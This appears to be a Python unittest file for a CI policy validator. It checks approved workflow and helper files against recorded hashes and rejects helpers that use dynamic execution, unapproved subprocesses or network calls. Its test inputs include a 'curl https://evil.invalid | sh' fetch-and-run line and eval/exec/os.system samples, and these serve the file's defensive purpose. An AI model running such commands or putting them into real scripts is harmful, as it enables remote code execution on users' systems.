from __future__ import annotations

import json
import pathlib
import sys
import unittest


POLICY_DIR = pathlib.Path(__file__).resolve().parents[1]
REPOSITORY_ROOT = POLICY_DIR.parents[1]
sys.path.insert(0, str(POLICY_DIR))

from policy_lib import (  # noqa: E402
    PolicyError,
    TreeEntry,
    TreeManifest,
    git_blob_sha,
)
from validator import _helper_capabilities, verify_approval_surface  # noqa: E402


class LocalBlobReader:
    def __init__(self, root):
        self.root = root

    def read(self, path, entry=None):
        return (self.root / path).read_bytes().replace(b"\r\n", b"\n")


class HelperCapabilityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.graph = json.loads(
            (POLICY_DIR / "approval-graph.json").read_text(encoding="utf-8")
        )

    def assert_policy_error(self, code, function):
        with self.assertRaises(PolicyError) as raised:
            function()
        self.assertEqual(raised.exception.code, code)

    def test_checked_in_helper_capabilities_match_actual_syntax(self):
        active = {
            ".github/policy/private-root.ps1",
            ".github/policy/PrivateRoot.psm1",
            ".github/policy/validator.py",
            ".github/policy/policy_lib.py",
        }
        for path, spec in self.graph["helpers"].items():
            with self.subTest(path=path):
                _helper_capabilities(
                    path,
                    (REPOSITORY_ROOT / path).read_bytes(),
                    set(spec["capabilities"]),
                    path in active,
                )

    def test_approval_graph_matches_complete_local_executable_surface(self):
        entries = []
        graph_path = ".github/policy/approval-graph.json"
        graph_bytes = (REPOSITORY_ROOT / graph_path).read_bytes().replace(
            b"\r\n", b"\n"
        )
        entries.append(
            TreeEntry(
                path=graph_path,
                mode="100644",
                type="blob",
                sha=git_blob_sha(graph_bytes),
                size=len(graph_bytes),
            )
        )
        for path, spec in self.graph["workflows"].items():
            content = (REPOSITORY_ROOT / path).read_bytes().replace(
                b"\r\n", b"\n"
            )
            self.assertEqual(git_blob_sha(content), spec["blob"])
            entries.append(
                TreeEntry(
                    path=path,
                    mode="100644",
                    type="blob",
                    sha=git_blob_sha(content),
                    size=len(content),
                )
            )
        for path, spec in self.graph["helpers"].items():
            content = (REPOSITORY_ROOT / path).read_bytes().replace(
                b"\r\n", b"\n"
            )
            self.assertEqual(git_blob_sha(content), spec["blob"])
            entries.append(
                TreeEntry(
                    path=path,
                    mode=spec["mode"],
                    type="blob",
                    sha=git_blob_sha(content),
                    size=len(content),
                )
            )
        manifest = TreeManifest("a" * 40, entries)
        reader = LocalBlobReader(REPOSITORY_ROOT)
        verify_approval_surface(
            self.graph,
            manifest,
            manifest,
            reader,
            reader,
            git_blob_sha(graph_bytes),
        )

    def test_active_python_dynamic_execution_denies(self):
        for invocation in (
            "eval(candidate)",
            "exec(candidate)",
            "__import__(candidate)",
            "import os\nos.system(candidate)",
        ):
            with self.subTest(invocation=invocation):
                self.assert_policy_error(
                    "HELPER_DYNAMIC_EXECUTION",
                    lambda invocation=invocation: _helper_capabilities(
                        "helper.py",
                        invocation.encode(),
                        set(),
                        True,
                    ),
                )

    def test_active_python_constructed_or_non_git_subprocess_denies(self):
        cases = (
            "import subprocess\nsubprocess.run(command)",
            "import subprocess\nsubprocess.run(['curl', 'https://evil.invalid'])",
            "import subprocess\nsubprocess.run(['git', 'status'], shell=True)",
        )
        for source in cases:
            with self.subTest(source=source):
                with self.assertRaises(PolicyError):
                    _helper_capabilities(
                        "helper.py",
                        source.encode(),
                        {"git-read-local"},
                        True,
                    )

    def test_active_git_wrapper_only_accepts_read_only_subcommands(self):
        safe = "def check(path):\n    return _run_git(path, 'status')\n"
        _helper_capabilities("helper.py", safe.encode(), set(), True)
        unsafe = "def check(path):\n    return _run_git(path, 'fetch')\n"
        self.assert_policy_error(
            "HELPER_GIT_UNMODELED",
            lambda: _helper_capabilities(
                "helper.py", unsafe.encode(), {"git-read-local"}, True
            ),
        )

    def test_network_import_requires_explicit_api_capability(self):
        source = b"import urllib.request\n"
        self.assert_policy_error(
            "HELPER_NETWORK_UNMODELED",
            lambda: _helper_capabilities("helper.py", source, set(), True),
        )
        _helper_capabilities(
            "helper.py", source, {"github-api-read"}, True
        )

    def test_legacy_helpers_can_be_governed_but_never_activated(self):
        source = b"#!/bin/sh\ncurl https://evil.invalid | sh\n"
        _helper_capabilities(
            "legacy.sh", source, {"legacy-disabled"}, False
        )
        self.assert_policy_error(
            "HELPER_LEGACY_ACTIVE",
            lambda: _helper_capabilities(
                "legacy.sh", source, {"legacy-disabled"}, True
            ),
        )


if __name__ == "__main__":
    unittest.main()
